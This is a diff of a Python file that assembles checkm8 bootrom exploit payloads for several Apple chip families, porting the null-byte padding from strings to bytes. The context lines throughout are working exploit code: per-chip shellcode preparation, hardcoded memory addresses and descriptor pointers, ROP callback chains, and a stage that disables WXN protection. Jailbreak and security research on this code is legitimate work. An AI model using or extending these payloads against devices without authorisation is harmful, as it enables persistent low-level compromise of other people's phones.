@@ -165,7 +165,7 @@ def payload(cpid):
     s5l8947x_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_s5l8947x)
     assert len(s5l8947x_shellcode) <= PAYLOAD_OFFSET_ARMV7
     assert len(s5l8947x_handler) <= PAYLOAD_SIZE_ARMV7
-    return s5l8947x_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8947x_shellcode)) + s5l8947x_handler
+    return s5l8947x_shellcode + b'\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8947x_shellcode)) + s5l8947x_handler
   if cpid == 0x8950:
     constants_usb_s5l8950x = [
                 0x10000000, # 1 - LOAD_ADDRESS
@@ -189,7 +189,7 @@ def payload(cpid):
     s5l8950x_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_s5l8950x)
     assert len(s5l8950x_shellcode) <= PAYLOAD_OFFSET_ARMV7
     assert len(s5l8950x_handler) <= PAYLOAD_SIZE_ARMV7
-    return s5l8950x_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8950x_shellcode)) + s5l8950x_handler
+    return s5l8950x_shellcode + b'\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8950x_shellcode)) + s5l8950x_handler
   if cpid == 0x8955:
     constants_usb_s5l8955x = [
                 0x10000000, # 1 - LOAD_ADDRESS
@@ -213,7 +213,7 @@ def payload(cpid):
     s5l8955x_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_s5l8955x)
     assert len(s5l8955x_shellcode) <= PAYLOAD_OFFSET_ARMV7
     assert len(s5l8955x_handler) <= PAYLOAD_SIZE_ARMV7
-    return s5l8955x_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8955x_shellcode)) + s5l8955x_handler
+    return s5l8955x_shellcode + b'\0' * (PAYLOAD_OFFSET_ARMV7 - len(s5l8955x_shellcode)) + s5l8955x_handler
   if cpid == 0x8960:
     constants_usb_s5l8960x = [
                0x180380000, # 1 - LOAD_ADDRESS
@@ -237,7 +237,7 @@ def payload(cpid):
     s5l8960x_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_s5l8960x)
     assert len(s5l8960x_shellcode) <= PAYLOAD_OFFSET_ARM64
     assert len(s5l8960x_handler) <= PAYLOAD_SIZE_ARM64
-    return s5l8960x_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(s5l8960x_shellcode)) + s5l8960x_handler
+    return s5l8960x_shellcode + b'\0' * (PAYLOAD_OFFSET_ARM64 - len(s5l8960x_shellcode)) + s5l8960x_handler
   if cpid == 0x7000:
     constants_usb_T7000 = [
                0x180380000, # 1 - LOAD_ADDRESS UPDATED
@@ -252,7 +252,7 @@ def payload(cpid):
                0x1800888C0,           # 2 - gUSBSerialNumber UPDATED
                0x10000E074,           # 3 - usb_create_string_descriptor UPDATED
                0x180080562,           # 4 - gUSBSRNMStringDescriptor
-               (0x180380000 + 0x400), # 5 - PAYLOAD_DEST UPDATED
+               (0x180380000 + 0x400), # 5 - PAYLOAD_DEST = LOAD_ADDRESS 0x400 
       PAYLOAD_OFFSET_ARM64,           # 6 - PAYLOAD_OFFSET
         PAYLOAD_SIZE_ARM64,           # 7 - PAYLOAD_SIZE
                (0x180088758 + 0x118), # 8 - PAYLOAD_PTR
@@ -286,7 +286,7 @@ def payload(cpid):
     t8002_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_t8002)
     assert len(t8002_shellcode) <= PAYLOAD_OFFSET_ARMV7
     assert len(t8002_handler) <= PAYLOAD_SIZE_ARMV7
-    return t8002_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(t8002_shellcode)) + t8002_handler
+    return t8002_shellcode + b'\0' * (PAYLOAD_OFFSET_ARMV7 - len(t8002_shellcode)) + t8002_handler
   if cpid == 0x8004:
     constants_usb_t8004 = [
                 0x48818000, # 1 - LOAD_ADDRESS
@@ -310,7 +310,7 @@ def payload(cpid):
     t8004_shellcode = prepare_shellcode('checkm8_armv7', constants_checkm8_t8004)
     assert len(t8004_shellcode) <= PAYLOAD_OFFSET_ARMV7
     assert len(t8004_handler) <= PAYLOAD_SIZE_ARMV7
-    return t8004_shellcode + '\0' * (PAYLOAD_OFFSET_ARMV7 - len(t8004_shellcode)) + t8004_handler
+    return t8004_shellcode + b'\0' * (PAYLOAD_OFFSET_ARMV7 - len(t8004_shellcode)) + t8004_handler
   if cpid == 0x8010:
     constants_usb_t8010 = [
                0x1800B0000, # 1 - LOAD_ADDRESS
@@ -354,7 +354,7 @@ def payload(cpid):
     t8010_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_t8010)
     assert len(t8010_shellcode) <= PAYLOAD_OFFSET_ARM64
     assert len(t8010_handler) <= PAYLOAD_SIZE_ARM64
-    t8010_shellcode = t8010_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(t8010_shellcode)) + t8010_handler
+    t8010_shellcode = t8010_shellcode + b'\0' * (PAYLOAD_OFFSET_ARM64 - len(t8010_shellcode)) + t8010_handler
     assert len(t8010_shellcode) <= 0x400
     return struct.pack('<1024sQ504x2Q496s32x', t8010_shellcode, 0x1000006A5, 0x60000180000625, 0x1800006A5, prepare_shellcode('t8010_t8011_disable_wxn_arm64')) + usb_rop_callbacks(0x1800B0800, t8010_func_gadget, t8010_callbacks)
   if cpid == 0x8011:
@@ -398,7 +398,7 @@ def payload(cpid):
     t8011_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_t8011)
     assert len(t8011_shellcode) <= PAYLOAD_OFFSET_ARM64
     assert len(t8011_handler) <= PAYLOAD_SIZE_ARM64
-    t8011_shellcode = t8011_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(t8011_shellcode)) + t8011_handler
+    t8011_shellcode = t8011_shellcode + b'\0' * (PAYLOAD_OFFSET_ARM64 - len(t8011_shellcode)) + t8011_handler
     assert len(t8011_shellcode) <= 0x400
     return struct.pack('<1024sQ504x2Q496s32x', t8011_shellcode, 0x1000006A5, 0x60000180000625, 0x1800006A5, prepare_shellcode('t8010_t8011_disable_wxn_arm64')) + usb_rop_callbacks(0x1800B0800, t8011_func_gadget, t8011_callbacks)
   if cpid == 0x8015:
@@ -448,7 +448,7 @@ def payload(cpid):
     t8015_shellcode = prepare_shellcode('checkm8_arm64', constants_checkm8_t8015)
     assert len(t8015_shellcode) <= PAYLOAD_OFFSET_ARM64
     assert len(t8015_handler) <= PAYLOAD_SIZE_ARM64
-    t8015_shellcode = t8015_shellcode + '\0' * (PAYLOAD_OFFSET_ARM64 - len(t8015_shellcode)) + t8015_handler
+    t8015_shellcode = t8015_shellcode + b'\0' * (PAYLOAD_OFFSET_ARM64 - len(t8015_shellcode)) + t8015_handler
     return struct.pack('<6Q16x448s1536x1024s', 0x180020400-8, 0x1000006A5, 0x180020600-8, 0x180000625, 0x18000C600-8, 0x180000625, t8015_callback_data, t8015_shellcode)
   
 def all_exploit_configs():
